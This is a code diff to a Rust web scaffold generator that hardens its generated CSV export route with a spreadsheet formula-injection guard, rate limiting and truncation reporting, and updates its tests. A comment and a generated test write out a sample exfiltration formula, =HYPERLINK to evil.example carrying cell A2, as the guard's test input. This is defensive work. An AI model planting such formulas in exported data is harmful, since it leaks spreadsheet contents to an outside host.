@@ -810,35 +810,59 @@ fn plan_scaffold_with_options_impl(
         && !options_with_key.model.sharded;
     // Issue #1315: the `CsvSchema` impl + `GET /{plural}/export.csv` download.
     // Must agree exactly with the `export_enabled` gate in `render_routes_file`
-    // (plus `--api`, which emits no HTML routes module at all). The two operands
-    // below are that gate's `owner_scoped_standard` / `owner_scoped_index` spelled
-    // in this scope's vocabulary: `authorize_wiring` IS `owner_authorizes &&
-    // !sharded && !live && !live_validation`, and `owner_authorizes` IS
-    // `authorize && owner.is_some()`.
-    let export_enabled = !options_with_key.api
-        && (authorize_wiring
-            || (!owner_authorizes && !options_with_key.live && !options_with_key.model.sharded));
+    // (plus `--api`, which emits no HTML routes module at all), or main.rs would
+    // mount a route the module never emitted.
+    //
+    // Spelled out operand by operand rather than reusing `authorize_wiring`,
+    // which is the same predicate today but is documented as the signal for the
+    // cross-user 403 smoke test — narrowing it for THAT reason would silently
+    // desync the two copies of THIS gate. `owner_authorizes` is
+    // `render_routes_file`'s `owner_scoped_index`; the first disjunct is its
+    // `owner_scoped_standard`.
+    // Bound as two named locals rather than one expression: the disjunction
+    // reads as the two index branches it mirrors, and clippy's `nonminimal_bool`
+    // would otherwise demand the algebraically-minimal form, which loses that.
+    let owner_scoped_standard_export = owner_authorizes
+        && !options_with_key.model.sharded
+        && !options_with_key.live
+        && !options_with_key.live_validation;
+    let plain_export =
+        !owner_authorizes && !options_with_key.live && !options_with_key.model.sharded;
+    let export_enabled = !options_with_key.api && (owner_scoped_standard_export || plain_export);
     // Smoke test under `tests/<snake>.rs`. Uses the same soft-delete-augmented
     // field list as the real migration (see `augment_fields_for_soft_delete`)
     // so the smoke test's throwaway table matches the real schema exactly.
     let smoke_test_fields =
         augment_fields_for_soft_delete(&fields, options_with_key.model.soft_delete)?;
+    let mut smoke_test = render_smoke_test(
+        &pascal_name,
+        &plural,
+        options_with_key.api,
+        &smoke_test_fields,
+        options_with_key.model.id_type,
+        metadata.indexes(),
+        metadata.defaults(),
+        metadata.validations(),
+        authorize_wiring,
+        bulk_delete_enabled,
+    );
+    // Issue #1315 (AC6): the CSV download test — status, media type, attachment
+    // disposition, header row, RFC 4180 quoting, and the empty cell a NULL
+    // column serializes to. Needs no database (its rows are in-process), so
+    // unlike the index read test it is not `#[ignore]`d.
+    //
+    // Appended HERE rather than inside `render_smoke_test` because it is the one
+    // generated test built from `fields` (the model's DECLARED columns, matching
+    // the emitted `CsvSchema`) instead of `smoke_test_fields` (the same list plus
+    // soft-delete's `deleted_at`, which the throwaway `CREATE TABLE` needs). Both
+    // are `&[Field]`, so passing them side by side into a 10-argument function
+    // would be a silent mix-up the compiler could not catch.
+    if export_enabled {
+        smoke_test.push_str(&render_csv_export_smoke_test(&plural, &fields));
+    }
     plan.create(
         project_root.join("tests").join(format!("{snake_name}.rs")),
-        render_smoke_test(
-            &pascal_name,
-            &plural,
-            options_with_key.api,
-            &smoke_test_fields,
-            options_with_key.model.id_type,
-            metadata.indexes(),
-            metadata.defaults(),
-            metadata.validations(),
-            authorize_wiring,
-            bulk_delete_enabled,
-            export_enabled,
-            &fields,
-        ),
+        smoke_test,
     );
 
     // `src/main.rs` updates: declare modules + register all new routes.
@@ -1044,10 +1068,20 @@ fn plan_scaffold_with_options_impl(
             plan.modify(cargo_path.clone(), updated);
         }
         // Pushed unconditionally — see the `maud` block above for why.
+        //
+        // `owner_dir: None` (unlike `maud`'s `src/routes`) because "some routes
+        // file still exists" is the wrong question for `csv`: only an
+        // EXPORT-ENABLED resource needs the feature, so a surviving `--live` or
+        // `--sharded` routes module would pin it forever. The
+        // `autumn_web::data::csv::` marker registered in
+        // `emit::autumn_web_feature_markers` is the precise test — it matches
+        // another scaffold's emitted `CsvSchema` impl *and* any hand-written
+        // `import_csv`/`export_csv` code, and matches neither when the resource
+        // being destroyed was the only user.
         plan.push_revert(Revert::CargoAutumnWebFeature {
             path: cargo_path,
             feature: "csv".to_owned(),
-            owner_dir: Some(project_root.join("src").join("routes")),
+            owner_dir: None,
         });
     }
 
@@ -3872,6 +3906,28 @@ mod attachment_read_back_tests {
         } else {
             ("", String::new(), "", "repo.list(&list_query, &page_req)")
         };
+        // Issue #1319's search box swaps results in via htmx WITHOUT pushing a
+        // URL, so the index's query string — and therefore this export's — never
+        // carries the search term, and `ListQuery` has no field for one. Say so
+        // in the emitted docs rather than let the "matches the filtered view"
+        // sentence above quietly overpromise on a searchable scaffold.
+        // Built with `format!`, not spliced as a literal: this fragment names the
+        // resource's own search route, and the OUTER `format!` does not expand
+        // placeholders inside an already-substituted value — a `{plural}` left in
+        // a plain `&str` here would reach the user's source verbatim.
+        let search_note = if search_enabled {
+            format!(
+                "///\n\
+                 /// NOT included: the `/{plural}/search` term. `ListQuery` carries sort\n\
+                 /// and column filters, not a full-text query, and the search box swaps\n\
+                 /// its results in without changing the URL — so a search on screen does\n\
+                 /// not narrow this download. Filter with `?filter[col]=` instead, or\n\
+                 /// extend this handler to take `q` and call the repository's\n\
+                 /// `search_page`.\n"
+            )
+        } else {
+            String::new()
+        };
         let scope_note = if owner_scoped_standard {
             "///\n\
              /// Rows are read through the repository's OWNER-SCOPED `list_scoped`, the\n\
@@ -3884,10 +3940,13 @@ mod attachment_read_back_tests {
             "{schema_impl}\n\
              /// The most rows one `GET /{plural}/export.csv` will read.\n\
              ///\n\
-             /// The response is built in memory, so this is the ceiling on how much a\n\
-             /// single request can cost. Raise it if your spreadsheets are bigger than\n\
-             /// this; if you need a genuinely unbounded export, stream the batches\n\
-             /// straight into the response body instead of collecting them first.\n\
+             /// This bounds the ROW COUNT, which bounds memory only as far as your\n\
+             /// widest row: the response is collected in memory before it is sent, so\n\
+             /// a model with an unbounded `Text` column can still build a large body\n\
+             /// here. Put a `{{max}}` length on such columns, lower this constant, or —\n\
+             /// for a genuinely unbounded export — stream the batches straight into\n\
+             /// the response body with `Download::from_stream` instead of collecting\n\
+             /// them first.\n\
              const MAX_EXPORT_ROWS: usize = 10_000;\n\n\
              /// `GET /{plural}/export.csv` — the list view as an RFC 4180 CSV download.\n\
              ///\n\
@@ -3901,12 +3960,28 @@ mod attachment_read_back_tests {
              /// table) and capped at `MAX_EXPORT_ROWS`. `Content-Type`,\n\
              /// `Content-Disposition` and `Content-Length` come from `Download`, which\n\
              /// infers `text/csv` from the `.csv` filename and sanitizes the name.\n\
-             {scope_note}{secured_attr}\
+             ///\n\
+             /// COST, not row-set, is why this carries a `#[throttle]` the index does\n\
+             /// not: one export reads up to `MAX_EXPORT_ROWS` rows over ~100 queries\n\
+             /// where one index page reads 100 rows over two, so without a per-IP\n\
+             /// bucket this route is a ~100x amplifier on whatever traffic the index\n\
+             /// already accepts. The limit applies per client address and is\n\
+             /// independent of `security.rate_limit.enabled` (that flag governs the\n\
+             /// GLOBAL limiter); raise it freely for an internal back-office.\n\
+             ///\n\
+             /// AUTHORIZATION is the index's, not `show`'s: like the index, this lists\n\
+             /// rows without calling `authorize(.., \"show\", &row)` per record. If you\n\
+             /// tighten `can_show` in the generated policy so some rows are hidden on\n\
+             /// their detail page, filter them out of BOTH the index query and this\n\
+             /// one — a per-row rule the list path does not apply is not enforced.\n\
+             {search_note}{scope_note}{secured_attr}\
              #[get(\"/{plural}/export.csv\")]\n\
+             #[autumn_web::throttle(limit = 6, per = \"1m\", key = \"ip\")]\n\
              pub async fn export_csv(\n    \
              list_query: ListQuery,{authz_params}\n    \
              repo: Pg{pascal_name}Repository,\n\
-             ) -> AutumnResult<autumn_web::download::Download> {{\n\
+             ) -> AutumnResult<autumn_web::reexports::axum::response::Response> {{\n    \
+             use autumn_web::reexports::axum::response::IntoResponse as _;\n\
              {owner_let}    \
              let batch_size = autumn_web::pagination::MAX_PAGE_SIZE;\n    \
              let mut rows: Vec<{pascal_name}> = Vec::new();\n    \
@@ -3922,10 +3997,33 @@ mod attachment_read_back_tests {
              }}\n        \
              page += 1;\n    \
              }}\n    \
+             // Truncate rather than fail: a partial spreadsheet beats a 500. But a\n    \
+             // SILENTLY partial one is a trap for anyone exporting to reconcile, so\n    \
+             // say so twice — once in the log for the operator, once in a response\n    \
+             // header the client can see. Narrow the filter, or raise\n    \
+             // `MAX_EXPORT_ROWS`. (A marker row inside the CSV is not an option: it\n    \
+             // would parse as data.)\n    \
+             let truncated = rows.len() > MAX_EXPORT_ROWS;\n    \
+             if truncated {{\n        \
+             autumn_web::reexports::tracing::warn!(\n            \
+             cap = MAX_EXPORT_ROWS,\n            \
+             rows = rows.len(),\n            \
+             \"{plural} CSV export hit MAX_EXPORT_ROWS; the download is truncated\"\n        \
+             );\n        \
              rows.truncate(MAX_EXPORT_ROWS);\n    \
+             }}\n    \
              let mut body: Vec<u8> = Vec::new();\n    \
              autumn_web::data::csv::export_csv(rows, &mut body)?;\n    \
-             Ok(autumn_web::download::Download::from_bytes(body).filename(\"{plural}.csv\"))\n\
+             let mut response = autumn_web::download::Download::from_bytes(body)\n        \
+             .filename(\"{plural}.csv\")\n        \
+             .into_response();\n    \
+             if truncated {{\n        \
+             response.headers_mut().insert(\n            \
+             \"x-export-truncated\",\n            \
+             autumn_web::reexports::http::HeaderValue::from_static(\"true\"),\n        \
+             );\n    \
+             }}\n    \
+             Ok(response)\n\
              }}\n"
         )
     } else {
@@ -4089,7 +4187,12 @@ mod attachment_read_back_tests {
              } else {\n        \
              format!(\"{}?{}\", paths::export_csv(), pager_query)\n    \
              };\n",
-            "\n        (autumn_web::a11y::Link::new(export_href.as_str(), \"Export CSV\"))",
+            // The explicit `" "` matters: Maud drops template whitespace between
+            // nodes, so without it the two anchors render as one glued run
+            // ("New PostExport CSV"). Same separator the generated `show` view
+            // puts between its "Back to list" and "Edit" links.
+            "\n        \" \"\n        \
+             (autumn_web::a11y::Link::new(export_href, \"Export CSV\"))",
         )
     } else {
         ("", "")
@@ -6401,12 +6504,17 @@ fn cell_value_expr(field: &Field) -> String {
 /// an owned `String` — and, per AC7, a NULL column must land on the EMPTY
 /// string, never the literal `"None"` a `{:?}` of an `Option` would print.
 ///
-/// Quoting is deliberately NOT applied here: `export_csv` writes RFC 4180, so a
-/// value carrying a comma, a double quote or a newline is quoted and escaped by
-/// the writer. Pre-quoting would double-escape it.
+/// RFC 4180 quoting is deliberately NOT applied here: `export_csv` writes RFC
+/// 4180, so a value carrying a comma, a double quote or a newline is quoted and
+/// escaped by the writer. Pre-quoting would double-escape it.
+///
+/// Spreadsheet FORMULA neutralization is a different problem and IS applied
+/// here, because RFC 4180 says nothing about it: every column whose value can
+/// carry attacker-supplied text is wrapped in the emitted `csv_text_cell`
+/// helper. See [`csv_kind_is_text`] for which kinds those are.
 fn csv_value_expr(field: &Field) -> String {
     let name = &field.name;
-    match (field.nullable, field.kind) {
+    let raw = match (field.nullable, field.kind) {
         // Attachment is always `Option<Blob>`. `Blob` has no `Display`, and the
         // index's "attachment"/"—" presence marker is useless in a spreadsheet —
         // export the store KEY, the one value that finds the file again.
@@ -6432,19 +6540,92 @@ fn csv_value_expr(field: &Field) -> String {
         // Decimal, the generated enums, and `references` foreign keys).
         (true, _) => format!("self.{name}.as_ref().map(ToString::to_string).unwrap_or_default()"),
         (false, _) => format!("self.{name}.to_string()"),
+    };
+    if csv_kind_is_text(field.kind) {
+        format!("csv_text_cell({raw})")
+    } else {
+        raw
     }
 }
+
+/// Whether a column's exported value can carry arbitrary user-supplied text,
+/// and so must go through the emitted `csv_text_cell` formula guard (#1315).
+///
+/// The closed set here is the point: a numeric, boolean, UUID, timestamp or
+/// `Decimal` column is rendered by Rust's `Display` from a typed value, so it
+/// cannot begin with `=`/`+`/`@` — and guarding it anyway would prefix a
+/// legitimate negative number (`-5` → `'-5`) and break the spreadsheet's own
+/// parsing. `Enum` is a generated Rust enum whose variants are compile-time
+/// idents, so it is closed-set too. `Bytea` and `Attachment` are included: the
+/// first is lossy UTF-8 of arbitrary bytes, and the second is a store key whose
+/// tail is a browser-supplied filename.
+const fn csv_kind_is_text(kind: FieldKind) -> bool {
+    matches!(
+        kind,
+        FieldKind::String
+            | FieldKind::Text
+            | FieldKind::RichText
+            | FieldKind::Slug
+            | FieldKind::Bytea
+            | FieldKind::Attachment
+    )
+}
+
+/// The `csv_text_cell` helper the generated `to_csv_record` wraps every
+/// text-backed column in (issue #1315).
+///
+/// Emitted once per routes module, immediately above the `CsvSchema` impl.
+const CSV_TEXT_CELL_HELPER: &str = "\n\n\
+    /// Neutralize a spreadsheet formula in an exported text cell.\n\
+    ///\n\
+    /// RFC 4180 — which `export_csv` implements — governs commas, quotes and\n\
+    /// newlines, and says nothing about formulas. Excel and LibreOffice evaluate a\n\
+    /// cell beginning `=`, `+`, `-`, `@`, TAB or CR as a formula EVEN INSIDE\n\
+    /// QUOTES, so a row someone else typed (`=HYPERLINK(\"https://evil.example/?\"&A2,\"report\")`,\n\
+    /// `=WEBSERVICE(..)`) can exfiltrate the rest of the sheet when a colleague\n\
+    /// opens the download. Prefixing an apostrophe makes the spreadsheet treat the\n\
+    /// value as literal text; the apostrophe is not part of the stored data and is\n\
+    /// not shown in the cell.\n\
+    ///\n\
+    /// Applied only to TEXT-backed columns. Numeric, boolean, UUID, timestamp and\n\
+    /// enum columns are rendered from typed values by `Display`, so they cannot\n\
+    /// carry a formula — and guarding them would corrupt a negative number.\n\
+    ///\n\
+    /// Delete the `csv_text_cell(..)` wrappers below if you would rather export\n\
+    /// values byte-for-byte and never open the file in a spreadsheet.\n\
+    fn csv_text_cell(value: String) -> String {\n    \
+    if value.starts_with(['=', '+', '-', '@', '\\t', '\\r']) {\n        \
+    let mut guarded = String::with_capacity(value.len() + 1);\n        \
+    guarded.push('\\'');\n        \
+    guarded.push_str(&value);\n        \
+    guarded\n    \
+    } else {\n        \
+    value\n    \
+    }\n\
+    }";
 
 /// Emit the `impl CsvSchema for {Pascal} { … }` block the export route streams
 /// through `export_csv` (issue #1315).
 ///
 /// Columns are `id`, every scaffolded column in declaration order, then the
-/// model's always-present `created_at` — exactly the set (and order) the `show`
-/// view renders, which is a superset of the index table's (a `--default`ed
-/// column is dropped from the form and the table, but it is still data an author
-/// downloading a spreadsheet wants). The soft-delete `deleted_at` bookkeeping
-/// column is deliberately excluded: a soft-deleted row never reaches the index,
-/// so it never reaches the export either.
+/// model's always-present `created_at` — the same COLUMN SET (and order) the
+/// `show` view renders, which is a superset of the index table's (a
+/// `--default`ed column is dropped from the form and the table, but it is still
+/// data an author downloading a spreadsheet wants).
+///
+/// The VALUES can differ from `show`'s for two kinds, deliberately: a
+/// `references` column exports the raw foreign key rather than the parent label
+/// the view resolves (an id round-trips back through `import_csv`; a label does
+/// not, and resolving one per row would be an N+1 inside the export loop), and
+/// an `Attachment` exports the blob's storage key rather than a signed URL that
+/// would have expired by the time anyone opened the file.
+///
+/// `fields` must be the model's DECLARED columns — the list before
+/// [`augment_fields_for_soft_delete`] appends `deleted_at`. Under
+/// `--soft-delete` the model struct does carry a `deleted_at` field, but the
+/// export deliberately omits it: `list`/`list_scoped` filter
+/// `deleted_at IS NULL`, so the column is NULL for every row that can reach the
+/// export, and a column that is always blank is noise in a spreadsheet.
 fn render_csv_schema_impl(pascal_name: &str, fields: &[Field]) -> String {
     use std::fmt::Write as _;
     let mut headers = String::from("\"id\"");
@@ -6455,8 +6636,16 @@ fn render_csv_schema_impl(pascal_name: &str, fields: &[Field]) -> String {
     }
     headers.push_str(", \"created_at\"");
     record.push_str("            self.created_at.to_string(),\n");
+    // The formula guard is emitted only when some column actually routes through
+    // it — an unused `fn` in the generated app is a `dead_code` warning, and the
+    // scaffold's contract is that generated code compiles warning-free.
+    let text_cell_helper = if fields.iter().any(|f| csv_kind_is_text(f.kind)) {
+        CSV_TEXT_CELL_HELPER
+    } else {
+        ""
+    };
     format!(
-        "\n\n/// CSV column schema for the `GET /…/export.csv` download (issue #1315).\n\
+        "{text_cell_helper}\n\n/// CSV column schema for the `GET /…/export.csv` download (issue #1315).\n\
          ///\n\
          /// `csv_columns` is the header row and `to_csv_record` the value row: the\n\
          /// two MUST stay the same length and in the same order, which is the\n\
@@ -6469,9 +6658,15 @@ fn render_csv_schema_impl(pascal_name: &str, fields: &[Field]) -> String {
          /// containing a comma, a double quote or a newline is quoted and escaped\n\
          /// by the writer — pre-quoting would double-escape it.\n\
          ///\n\
-         /// NOTE: a spreadsheet application may interpret a leading `=`, `+`, `-`\n\
-         /// or `@` in a cell as a formula. If this model holds untrusted text and\n\
-         /// the export is opened in Excel, prefix-guard those values here.\n\
+         /// Text-backed columns go through `csv_text_cell`, which neutralizes a\n\
+         /// leading `=`/`+`/`-`/`@` so a spreadsheet cannot execute a value someone\n\
+         /// typed into this app as a formula. See that helper for the rationale and\n\
+         /// how to opt out.\n\
+         ///\n\
+         /// An `Attachment` column exports the blob's STORAGE KEY, not the signed,\n\
+         /// time-bounded URL the `show` view renders — a spreadsheet cell has no\n\
+         /// use for a URL that expires. Drop the column here if those keys should\n\
+         /// not leave the app.\n\
          impl autumn_web::data::csv::CsvSchema for {pascal_name} {{\n    \
          fn csv_columns() -> &'static [&'static str] {{\n        \
          &[{headers}]\n    \
@@ -7094,12 +7289,6 @@ fn render_smoke_test(
     validations: &BTreeMap<String, Vec<String>>,
     authorize: bool,
     bulk_delete: bool,
-    export_csv: bool,
-    // The model's OWN columns, i.e. `fields` before
-    // `augment_fields_for_soft_delete` adds `deleted_at`. The generated
-    // `CsvSchema` impl is built from the model struct, which carries no
-    // `deleted_at`, so the CSV test's header row must be too (issue #1315).
-    csv_fields: &[Field],
 ) -> String {
     let stub_tables_sql = render_reference_stub_tables_sql(fields, plural);
     let create_table_sql =
@@ -7154,16 +7343,6 @@ fn render_smoke_test(
         base
     } else {
         base + &render_write_path_smoke_test(pascal_name, plural, bulk_delete)
-    };
-
-    // Issue #1315 (AC6): prove the CSV download contract — status, media type,
-    // attachment disposition, header row, RFC 4180 quoting and the empty cell a
-    // NULL column serializes to. Needs no database (the stand-in rows are
-    // in-process), so unlike the index read test it is not `#[ignore]`d.
-    let base = if export_csv {
-        base + &render_csv_export_smoke_test(plural, csv_fields)
-    } else {
-        base
     };
 
     // Issue #1236 (AC6): attachment scaffolds additionally get a multipart
@@ -7397,14 +7576,23 @@ fn render_validation_rejection_smoke_test(
 ///
 /// Like [`render_write_path_smoke_test`] this drives a stand-in resource rather
 /// than the real `routes::{plural}::export_csv` — a `tests/` binary cannot
-/// import a project's own code when the project has no `src/lib.rs`. What it
-/// DOES exercise for real is everything the scaffold does not own: `export_csv`
-/// writing RFC 4180, `Download` deriving `Content-Type`/`Content-Disposition`
-/// from the `.csv` filename, and the full in-process request pipeline. The
-/// header row is the model's actual columns, so the test fails if someone edits
-/// `csv_columns` in `src/routes/{plural}.rs` without updating the expectation.
+/// import a project's own code when the project has no `src/lib.rs`, so the
+/// stand-in restates the model's column list and the two cell expressions the
+/// generated impl uses (`unwrap_or_default()` for a NULL, `csv_text_cell` for
+/// text).
+///
+/// What it proves is the DOWNLOAD CONTRACT end to end on the real shipped
+/// primitives: `export_csv` writing RFC 4180, `Download` deriving
+/// `Content-Type`/`Content-Disposition`/`Content-Length` from the `.csv`
+/// filename, the formula guard surviving into the body, and the whole
+/// in-process request pipeline. It does NOT pin `src/routes/{plural}.rs`'s
+/// `csv_columns` — nothing in a `tests/` binary can see that impl; the
+/// generator-side tests (`csv_columns_cover_every_scaffolded_column_in_
+/// declaration_order`, `csv_value_expr_never_stringifies_an_option_as_none`)
+/// own that.
 ///
 /// Needs no database, so it is NOT `#[ignore]`d — it runs on a bare `cargo test`.
+#[allow(clippy::too_many_lines)] // the emitted test body is one raw-string template
 fn render_csv_export_smoke_test(plural: &str, fields: &[Field]) -> String {
     use std::fmt::Write as _;
     // The header row `export_csv` writes: `id` plus the model's own columns, in
@@ -7421,48 +7609,73 @@ fn render_csv_export_smoke_test(plural: &str, fields: &[Field]) -> String {
         let _ = write!(columns, ", \"{name}\"");
         let _ = write!(header_row, ",{name}");
     }
-    // One filled cell per non-id column for the first row. The second row puts
-    // a comma + double quote + newline in its FIRST cell (so RFC 4180 quoting is
-    // asserted, not assumed) and leaves the rest empty — the shape a NULL column
-    // must produce.
-    let filled: Vec<String> = names
-        .iter()
-        .map(|name| format!("\"{name}-value\".to_owned()"))
-        .collect();
-    let awkward: Vec<String> = names
-        .iter()
-        .enumerate()
-        .map(|(i, _)| {
-            if i == 0 {
-                // `a,b "q"` + a newline: every character RFC 4180 has a rule for.
-                "\"a,b \\\"q\\\"\\nz\".to_owned()".to_owned()
-            } else {
-                "String::new()".to_owned()
+    // Three rows, each isolating one rule. Every cell is an `Option<String>` so
+    // `None` genuinely models a NULL column: if the emitted expression were a
+    // debug format instead of `unwrap_or_default()`, the `None` assertion below
+    // would fire. Rows 2 and 3 put the interesting value in the FIRST cell and
+    // leave the rest NULL.
+    let cells = |first: &str| -> String {
+        let mut out = String::new();
+        for (i, _) in names.iter().enumerate() {
+            if i > 0 {
+                out.push_str(", ");
             }
-        })
-        .collect();
-    let filled_cells = filled.join(", ");
-    let awkward_cells = awkward.join(", ");
+            if i == 0 {
+                out.push_str(first);
+            } else {
+                out.push_str("None");
+            }
+        }
+        out
+    };
+    let filled_cells = names
+        .iter()
+        .map(|name| format!("Some(\"{name}-value\".to_owned())"))
+        .collect::<Vec<_>>()
+        .join(", ");
+    // `a,b "q"` + a newline: every character RFC 4180 has a rule for.
+    let quoting_cells = cells("Some(\"a,b \\\"q\\\"\\nz\".to_owned())");
+    // The classic exfiltration payload a colleague's spreadsheet would execute.
+    let formula_cells = cells(
+        "Some(\"=HYPERLINK(\\\"https://evil.example/?d=\\\"&A2,\\\"quarterly report\\\")\".to_owned())",
+    );
     format!(
         "\n\
          // ── CSV export download (issue #1315) ─────────────────────────────────────\n\
          //\n\
          // Drives the same `export_csv` + `Download` pair the generated\n\
-         // `GET /{plural}/export.csv` handler uses, over a stand-in row type carrying\n\
-         // the model's real column list. Proves the download contract (200,\n\
-         // `text/csv`, an `attachment` disposition, the header row) and the two\n\
-         // serialization rules the scaffold depends on: a NULL column is an EMPTY\n\
-         // cell, and a value containing a comma/quote/newline is RFC 4180 quoted.\n\
+         // `GET /{plural}/export.csv` handler uses. Proves the download contract\n\
+         // (200, `text/csv`, an `attachment` disposition, the header row) and the\n\
+         // three cell rules the export depends on: a NULL column is an EMPTY cell,\n\
+         // a value containing a comma/quote/newline is RFC 4180 quoted, and a value\n\
+         // that looks like a spreadsheet formula is neutralized.\n\
+         //\n\
+         // The row type is a stand-in -- a `tests/` binary cannot import this\n\
+         // project's own modules (see `docs/guide/tutorial/11-testing.md`) -- so it\n\
+         // restates the column list and the two cell expressions from\n\
+         // `src/routes/{plural}.rs`. Keep them in step if you edit that impl.\n\
          //\n\
          // No database required, so this runs on a plain `cargo test`.\n\
          #[tokio::test]\n\
          async fn {plural}_export_csv_downloads_a_spreadsheet() {{\n    \
          use autumn_web::test::{{TestApp, TestClient}};\n\n    \
+         /// Mirror of `src/routes/{plural}.rs`'s `csv_text_cell`.\n    \
+         fn csv_text_cell(value: String) -> String {{\n        \
+         if value.starts_with(['=', '+', '-', '@', '\\t', '\\r']) {{\n            \
+         let mut guarded = String::with_capacity(value.len() + 1);\n            \
+         guarded.push('\\'');\n            \
+         guarded.push_str(&value);\n            \
+         guarded\n        \
+         }} else {{\n            \
+         value\n        \
+         }}\n    \
+         }}\n\n    \
          /// Stand-in for the scaffolded model: `id` plus one cell per column, in\n    \
          /// the order `src/routes/{plural}.rs`'s `CsvSchema` impl lists them.\n    \
+         /// `None` is a NULL column.\n    \
          struct ExportRow {{\n        \
          id: i64,\n        \
-         cells: Vec<String>,\n    \
+         cells: Vec<Option<String>>,\n    \
          }}\n\n    \
          impl autumn_web::data::csv::CsvSchema for ExportRow {{\n        \
          fn csv_columns() -> &'static [&'static str] {{\n            \
@@ -7470,7 +7683,11 @@ fn render_csv_export_smoke_test(plural: &str, fields: &[Field]) -> String {
          }}\n\n        \
          fn to_csv_record(&self) -> Vec<String> {{\n            \
          let mut record = vec![self.id.to_string()];\n            \
-         record.extend(self.cells.iter().cloned());\n            \
+         record.extend(\n                \
+         self.cells\n                    \
+         .iter()\n                    \
+         .map(|cell| csv_text_cell(cell.clone().unwrap_or_default())),\n            \
+         );\n            \
          record\n        \
          }}\n    \
          }}\n\n    \
@@ -7478,7 +7695,8 @@ fn render_csv_export_smoke_test(plural: &str, fields: &[Field]) -> String {
          async fn export_csv() -> AutumnResult<autumn_web::download::Download> {{\n        \
          let rows = vec![\n            \
          ExportRow {{ id: 1, cells: vec![{filled_cells}] }},\n            \
-         ExportRow {{ id: 2, cells: vec![{awkward_cells}] }},\n        \
+         ExportRow {{ id: 2, cells: vec![{quoting_cells}] }},\n            \
+         ExportRow {{ id: 3, cells: vec![{formula_cells}] }},\n        \
          ];\n        \
          let mut body: Vec<u8> = Vec::new();\n        \
          autumn_web::data::csv::export_csv(rows, &mut body)?;\n        \
@@ -7494,7 +7712,8 @@ fn render_csv_export_smoke_test(plural: &str, fields: &[Field]) -> String {
          // The header row is the model's columns, in `csv_columns` order.\n        \
          .assert_body_contains(\"{header_row}\");\n\n    \
          let body = response.text();\n    \
-         // A NULL / absent column is an EMPTY cell -- never the literal `None`.\n    \
+         // Rows 2 and 3 carry NULL cells: those are EMPTY, never the literal\n    \
+         // `None` a debug format would print.\n    \
          assert!(\n        \
          !body.contains(\"None\"),\n        \
          \"a NULL column must export as an empty cell, not `None`:\\n{{body}}\"\n    \
@@ -7504,6 +7723,12 @@ fn render_csv_export_smoke_test(plural: &str, fields: &[Field]) -> String {
          assert!(\n        \
          body.contains(\"\\\"\\\"q\\\"\\\"\"),\n        \
          \"a value containing a quote must be RFC 4180 escaped:\\n{{body}}\"\n    \
+         );\n    \
+         // A leading `=` is neutralized, so a spreadsheet shows the text instead\n    \
+         // of executing it against the rest of the sheet.\n    \
+         assert!(\n        \
+         body.contains(\"'=HYPERLINK\"),\n        \
+         \"a formula-looking value must be prefixed so the sheet treats it as text:\\n{{body}}\"\n    \
          );\n\
          }}\n"
     )
@@ -12897,9 +13122,14 @@ async fn main() {
 
     #[test]
     fn csv_value_expr_never_stringifies_an_option_as_none() {
-        // #1315 AC7: EVERY nullable kind must land on `unwrap_or_default()`,
-        // i.e. the empty string. A missing arm here is what would silently
-        // export the literal `None` into a spreadsheet cell.
+        // #1315 AC7: a nullable column must land on `unwrap_or_default()`, i.e.
+        // the empty string. A missing arm is what would silently export the
+        // literal `None` into a spreadsheet cell.
+        //
+        // The list below is every `FieldKind` that exists today; `csv_value_expr`
+        // ends in catch-all arms, so a NEW kind would be covered by fallthrough
+        // and silently uncovered here. Add it to this list when you add it to the
+        // enum — same convention as `kind_is_sortable_excludes_blobs_and_enums`.
         for kind in [
             FieldKind::String,
             FieldKind::Text,
@@ -12923,12 +13153,26 @@ async fn main() {
             },
         ] {
             let expr = csv_value_expr(&csv_test_field("col", kind, true));
-            assert!(
-                expr.ends_with("unwrap_or_default()"),
-                "nullable {kind:?} must serialize to an empty cell, got: {expr}"
+            // `unwrap_or_default()` closes the value expression itself; a
+            // text-backed kind then wraps it in the `csv_text_cell` guard, so
+            // the trailing `)` may belong to that wrapper.
+            let unwrapped = expr
+                .strip_prefix("csv_text_cell(")
+                .and_then(|rest| rest.strip_suffix(')'))
+                .unwrap_or(&expr);
+            assert_eq!(
+                csv_kind_is_text(kind),
+                expr.starts_with("csv_text_cell("),
+                "the formula guard must be applied to exactly the text kinds, \
+                 and {kind:?} disagrees: {expr}"
             );
             assert!(
-                !expr.contains("{:?}"),
+                unwrapped.ends_with("unwrap_or_default()"),
+                "nullable {kind:?} must serialize to an empty cell, got: {expr}"
+            );
+            let debug_fmt = concat!('{', ":?", '}');
+            assert!(
+                !expr.contains(debug_fmt),
                 "nullable {kind:?} must not debug-format an Option, got: {expr}"
             );
         }
@@ -12939,10 +13183,13 @@ async fn main() {
         // `Blob` and `Vec<u8>` have no `Display`, so a bare `.to_string()`
         // would not compile. Attachment is ALWAYS `Option<Blob>`, hence the
         // same expression whether or not the field was declared nullable.
+        // Both carry the `csv_text_cell` guard: a blob key ends in a
+        // browser-supplied filename, and lossy UTF-8 of a `Bytea` is arbitrary
+        // user bytes — either can begin with `=`.
         let attachment = csv_value_expr(&csv_test_field("cover", FieldKind::Attachment, false));
         assert_eq!(
             attachment,
-            "self.cover.as_ref().map(|blob| blob.key.clone()).unwrap_or_default()"
+            "csv_text_cell(self.cover.as_ref().map(|blob| blob.key.clone()).unwrap_or_default())"
         );
         assert_eq!(
             csv_value_expr(&csv_test_field("cover", FieldKind::Attachment, true)),
@@ -12950,7 +13197,7 @@ async fn main() {
         );
         assert_eq!(
             csv_value_expr(&csv_test_field("payload", FieldKind::Bytea, false)),
-            "String::from_utf8_lossy(&self.payload).into_owned()"
+            "csv_text_cell(String::from_utf8_lossy(&self.payload).into_owned())"
         );
         // An `Enum` column's Rust type is the generated enum, NOT `String`
         // (see `Field::rust_type`), so it must take the `Display` arm rather
